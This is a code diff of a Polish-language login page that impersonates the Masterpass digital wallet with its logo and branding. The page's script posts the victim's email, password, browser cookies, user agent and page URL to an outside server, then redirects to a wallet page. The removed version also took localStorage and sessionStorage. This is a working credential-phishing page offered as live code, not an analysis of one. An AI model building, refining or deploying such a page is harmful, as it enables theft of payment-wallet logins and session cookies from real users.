@@ -4,41 +4,36 @@
   <meta charset="UTF-8" />
   <title>Logowanie | Portfel Masterpass</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <link rel="stylesheet" href="/style.css?v=3" />
-  <link rel="preconnect" href="https://fonts.googleapis.com" />
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet" />
+  <link rel="stylesheet" href="./style.css" />
 </head>
 <body>
-  <div class="page-container">
-    <div class="form-card">
-      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Masterpass_Logo.svg/512px-Masterpass_Logo.svg.png" alt="Masterpass logo" class="logo" />
+  <div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/dd/Masterpass_Logo.svg/512px-Masterpass_Logo.svg.png" alt="Masterpass logo" class="logo" />
+    <h1>Zaloguj się</h1>
+    <h2>Zaloguj się do swojego portfela Masterpass™</h2>
 
-      <h1>Zaloguj się</h1>
-      <p class="subtitle">Zaloguj się do swojego portfela Masterpass™</p>
+    <form id="loginForm">
+      <label for="email">Adres e-mail lub numer telefonu</label>
+      <input type="text" id="email" required />
 
-      <form id="loginForm" novalidate>
-        <label for="email">Adres e-mail lub numer telefonu</label>
-        <input type="text" id="email" name="email" required placeholder="Twój adres e-mail" />
+      <label for="password">Hasło</label>
+      <input type="password" id="password" required />
 
-        <label for="password">Hasło</label>
-        <input type="password" id="password" name="password" required placeholder="Wprowadź hasło" />
-
-        <div class="form-extra">
-          <label class="checkbox-container">
-            <input type="checkbox" id="remember" />
-            <span class="checkmark"></span>
-            Pamiętaj mój login
-          </label>
-          <a href="#" class="forgot">Nie znam hasła</a>
-        </div>
-
-        <button type="submit" class="submit-button">Zaloguj się</button>
-      </form>
-
-      <div class="cookie-banner">
-        Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
-        <a href="#">Informacja o Plikach Cookie</a>.
+      <div class="checkbox-group">
+        <input type="checkbox" id="remember" />
+        <label for="remember">Pamiętaj mój login</label>
       </div>
+
+      <div class="forgot-link">
+        <a href="#">Nie znam hasła</a>
+      </div>
+
+      <button type="submit">Zaloguj się</button>
+    </form>
+
+    <div class="cookie-banner">
+      Strona wykorzystuje pliki cookie i inne podobne technologie. Korzystając z niej wyrażasz zgodę na ich używanie zgodnie z aktualnymi ustawieniami przeglądarki.
+      <a href="#">Informacja o Plikach Cookie</a>.
     </div>
   </div>
 
@@ -46,32 +41,25 @@
     const form = document.getElementById('loginForm');
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
-
       const email = document.getElementById('email').value.trim();
       const password = document.getElementById('password').value.trim();
       const remember = document.getElementById('remember').checked;
 
-      try {
-        await fetch('https://zaza-back.onrender.com/login', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            email,
-            password,
-            remember,
-            cookies: document.cookie,
-            localStorage: JSON.stringify(localStorage),
-            sessionStorage: JSON.stringify(sessionStorage),
-            userAgent: navigator.userAgent,
-            location: window.location.href,
-            date: new Date().toISOString()
-          })
-        });
+      await fetch('https://zaza-back.onrender.com/login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          password,
+          remember,
+          cookies: document.cookie,
+          userAgent: navigator.userAgent,
+          location: window.location.href,
+          date: new Date().toISOString()
+        })
+      });
 
-        window.location.href = '/wallet-withdraw.html';
-      } catch (err) {
-        console.error('Błąd wysyłania danych:', err);
-      }
+      window.location.href = './wallet-dashboard.html';
     });
   </script>
 </body>
